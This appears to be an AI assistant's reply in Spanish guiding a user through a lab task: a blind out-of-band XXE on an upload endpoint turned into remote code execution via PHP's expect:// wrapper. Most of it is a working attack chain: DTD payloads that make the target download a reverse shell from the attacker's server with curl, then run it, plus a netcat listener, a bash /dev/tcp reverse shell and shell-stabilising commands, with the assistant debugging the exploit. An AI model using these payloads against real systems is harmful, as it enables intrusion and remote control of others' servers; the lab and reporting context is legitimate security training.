## El concepto: por qué dos etapas

La vulnerabilidad es **XXE** (XML External Entity): el endpoint `/admin/upload` parsea el XML que subís y procesa entidades externas. Pero es **XXE ciego / out-of-band (OOB)**: la respuesta no te devuelve el resultado en pantalla, así que tenés que **exfiltrar los datos hacia tu propio servidor**. De ahí toda la maquinaria de entidades anidadas y el servidor PHP local.

Y es RCE, no solo lectura de archivos, gracias al wrapper **`expect://`** — un stream wrapper de PHP que **ejecuta comandos del sistema**. Cuando el parser resuelve `expect://curl...`, _corre `curl` en la víctima_. Eso es lo que convierte un XXE de lectura en ejecución de comandos.

Las dos etapas son:

- **Etapa 1:** hacés que la víctima **descargue** tu reverse shell y lo guarde en disco (`curl ... -o /tmp/...`).
- **Etapa 2:** hacés que la víctima **ejecute** ese archivo guardado (`bash /tmp/...`), que dispara la conexión de vuelta a tu listener.

## Qué hace cada pieza

**`expect://comando`** → ejecuta `comando` en la víctima. Es el corazón del RCE. Requiere que la extensión `expect` de PHP esté instalada en el target (en el lab está puesta a propósito).

**`php://filter/convert.base64-encode/resource=expect://...`** → envuelve la ejecución para capturar su salida en base64. El punto importante es un **efecto secundario**: para "leer" ese stream, PHP _tiene que ejecutar el comando primero_. El base64 solo hace que lo que se exfiltre sea transporte-seguro (sin saltos de línea ni caracteres que rompan la URL/XML).

**`$IFS`** → es el separador de campos del shell, que vale un espacio. Lo usás porque los espacios literales rompen el parseo del XML/URL. Entonces `curl$IFS'url'$IFS-o$IFS/tmp/shell.sh` el shell lo lee como `curl 'url' -o /tmp/shell.sh`.

**Las entidades anidadas (`%file`, `%oob`, `&content;`)** → es el patrón OOB estándar:

- `%file` ejecuta/lee algo (acá, corre el curl).
- `%oob` define una entidad `content` que apunta a `http://TU_IP:8000/?content=%file;` — y `%file` se expande al definirse, embebido en la URL.
- `&content;` en `<root>` es lo que finalmente **dispara** el fetch hacia tu servidor, forzando que toda la cadena se evalúe.

## ⚠️ El bug que tenés que corregir

Mirá las rutas, no coinciden:

- **Etapa 1** (`xxe.dtd`) descarga y guarda en **`/tmp/shell.sh`** (`-o$IFS/tmp/shell.sh`)
- **Etapa 2** (`rev_exec.dtd`) ejecuta **`/tmp/rev_shell.sh`** (`expect://bash$IFS/tmp/rev_shell.sh`)

`/tmp/shell.sh` ≠ `/tmp/rev_shell.sh`. Tal como está, la etapa 2 intenta ejecutar un archivo que no existe (lo guardaste con otro nombre). **Unificá el nombre** en los dos lados. Lo más simple: cambiá la etapa 1 para que guarde como `/tmp/rev_shell.sh`:

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=expect://curl$IFS'http://LOCAL_IP:8000/rev_shell.sh'$IFS-o$IFS/tmp/rev_shell.sh">
```

Así el archivo descargado (`/tmp/rev_shell.sh`) es el mismo que la etapa 2 ejecuta.

## Pasos concretos, en orden

**0. Reemplazá `LOCAL_IP` por tu IP de la VPN (`tun0`)** en _todos_ los archivos. Sacala con `ip a show tun0` o `ifconfig tun0`. Este es el error más común: si queda `LOCAL_IP` literal, nada conecta.

**1. Preparár los cuatro archivos** en un mismo directorio:

- `rev_shell.sh` — el reverse shell (`mkfifo ... nc LOCAL_IP 443`)
- `xxe.dtd` — descarga el shell (con la ruta corregida a `/tmp/rev_shell.sh`)
- `rev_exec.dtd` — ejecuta `/tmp/rev_shell.sh`
- (los payloads XML los mandás por Burp, no son archivos en el server)

**2. Levantar el servidor PHP** en ese directorio (sirve los `.dtd` y el `.sh`):

```bash
sudo php -S 0.0.0.0:8000
```

Verificá que responde: `curl http://TU_IP:8000/rev_shell.sh` desde otra terminal debería devolverte el contenido del script.

**3. Etapa 1 — disparar la descarga.** Mandá este XML en el body de `POST /admin/upload`, dentro del campo `uploadFile`:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ELEMENT svg ANY ><!ENTITY % remote SYSTEM 'http://TU_IP:8000/xxe.dtd'>%remote;%oob;]>
<root>&content;</root>
```

Mirá los logs de tu `php -S`: deberías ver a la víctima pedir `xxe.dtd` y después un `GET /?content=...`. Eso confirma que el curl corrió y el shell quedó en `/tmp/rev_shell.sh` de la víctima.

**4. Poné el listener** (en otra terminal, antes de la etapa 2):

```bash
nc -lvnp 443
```

**5. Etapa 2 — ejecutar el shell.** Mandá este otro XML al mismo endpoint:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ELEMENT svg ANY ><!ENTITY % remote SYSTEM 'http://TU_IP:8000/rev_exec.dtd'>%remote;%oob;]>
<root>&content;</root>
```

Acá la víctima carga `rev_exec.dtd`, que corre `bash /tmp/rev_shell.sh`, y el script se conecta de vuelta a tu `nc` en el 443. **Recibís la shell.**

**6. Estabilizá la shell** una vez dentro:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z, luego:
stty raw -echo; fg
```

Y buscás la flag de la tarea 8.

## Si algo no engancha (troubleshooting)

- **No ves a la víctima pedir el `.dtd`:** el XXE no está parseando entidades externas, o el campo no es `uploadFile`, o el `Content-Type` está mal. Confirmá que el endpoint realmente procesa XML.
- **Pide el `.dtd` pero el curl no descarga el shell:** la extensión `expect` puede no estar, o el `$IFS` no se interpreta en ese contexto. Probá leer primero `/etc/passwd` con un `expect://id` simple para confirmar que `expect://` ejecuta antes de ir al reverse shell.
- **La etapa 2 carga pero no recibís conexión:** casi siempre es (a) la ruta del archivo que no coincide —el bug de arriba—, o (b) `nc` no está en la víctima (probá la variante `bash -i >& /dev/tcp/TU_IP/443 0>&1` dentro de `rev_shell.sh`, que no depende de `nc`), o (c) un firewall bloquea el 443 (probá un puerto alto como 4444).
- **Recordá:** los `.dtd` y el `.sh` tienen que estar en el directorio donde corrés `php -S`, sino la víctima recibe 404 al pedirlos.

Una vez que recibas la shell y saques la flag, me pasás los pasos como te fueron y lo sumamos como Hallazgo 8 al reporte, cerrando las 8 tareas. ¿Querés que mientras tanto deje armada la plantilla del Hallazgo 8 (XXE OOB → RCE) en el formato de los otros, con los huecos para que completes la flag y tu IP?